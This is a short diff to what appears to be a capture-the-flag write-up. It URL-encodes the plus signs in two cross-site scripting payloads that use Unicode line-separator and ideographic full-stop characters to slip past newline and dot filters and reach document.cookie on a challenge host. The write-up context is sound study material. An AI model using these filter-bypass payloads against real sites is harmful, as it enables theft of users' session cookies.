@@ -119,7 +119,7 @@ Here we use unicode `U+2028` and `U+3002` to bypass `\n` and `.` filters.
 
 ```
 http://3.114.5.202/fd.php
-?q=ssl。orange。tw?xx"+document[`cookie`]%E2%80%A8-->
+?q=ssl。orange。tw?xx"%2bdocument[`cookie`]%E2%80%A8-->
 ```
 
 #### Unintended Solution
@@ -128,7 +128,7 @@ http://3.114.5.202/fd.php
 
 ```
 http://3.114.5.202/fd.php
-?q=ssl。orange。tw?`+"+document[`cookie`];(`${`
+?q=ssl。orange。tw?`%2b"%2bdocument[`cookie`];(`${`
 ```
 
 #### Write Ups
